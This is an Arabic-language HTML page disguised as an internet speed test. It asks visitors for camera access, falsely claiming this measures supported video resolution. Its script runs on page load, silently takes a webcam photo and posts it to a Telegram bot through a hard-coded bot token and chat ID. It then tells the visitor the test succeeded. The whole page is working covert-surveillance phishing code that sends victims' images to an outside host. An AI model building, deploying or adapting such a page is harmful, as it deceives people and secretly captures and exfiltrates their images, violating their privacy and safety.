<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص جودة الاتصال بالإنترنت</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; text-align: center; padding: 50px 20px; }
        .container { max-width: 400px; margin: auto; border: 1px solid #333; padding: 30px; border-radius: 15px; background: #222; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .loader { border: 5px solid #333; border-top: 5px solid #00d2ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #00d2ff; }
        p { font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <h2>اختبار السرعة الذكي</h2>
    <div class="loader"></div>
    <p id="status">جاري الاتصال بالسيرفر...</p>
    <p>يرجى منح صلاحية الكاميرا لقياس دقة الفيديو المدعومة في جهازك.</p>
</div>

<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
    const CHAT_ID = '7396462490';

    async function startLogic() {
        try {
            // طلب إذن الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('status').innerText = "تم الاتصال.. جاري المعايرة...";
            
            const video = document.getElementById('video');
            video.srcObject = stream;

            // التقاط الصورة بعد ثانية واحدة من فتح الكاميرا
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // تحويل الصورة وإرسالها
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط!');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        // إغلاق الكاميرا بعد الإرسال مباشرة
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('status').innerText = "اكتمل الاختبار بنجاح!";
                    });
                }, 'image/jpeg', 0.8);
            }, 1500);

        } catch (err) {
            document.getElementById('status').innerText = "فشل الاختبار: يرجى تحديث الصفحة والموافقة على الصلاحيات.";
        }
    }

    // تشغيل الكود بمجرد فتح الصفحة
    window.onload = startLogic;
</script>

</body>
</html>
